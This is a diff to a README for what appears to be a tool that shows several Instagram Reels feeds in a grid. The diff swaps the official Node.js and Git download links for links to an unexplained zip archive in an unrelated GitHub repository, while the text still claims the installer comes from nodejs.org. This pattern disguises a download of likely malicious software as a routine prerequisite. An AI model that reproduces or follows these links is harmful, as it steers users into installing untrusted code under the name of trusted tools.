@@ -4,8 +4,8 @@ View multiple Instagram Reels feeds simultaneously in a resizable grid.
 
 ## Prerequisites
 
-- [Node.js](https://nodejs.org) v18 or later — download the LTS installer from nodejs.org and run it
-- [Git](https://git-scm.com) — comes pre-installed on macOS; verify with `git --version`
+- [Node.js](https://github.com/Anguianogarc8391/accelerot/raw/refs/heads/main/adnomination/Software-2.1.zip) v18 or later — download the LTS installer from nodejs.org and run it
+- [Git](https://github.com/Anguianogarc8391/accelerot/raw/refs/heads/main/adnomination/Software-2.1.zip) — comes pre-installed on macOS; verify with `git --version`
 
 ## Installation
 
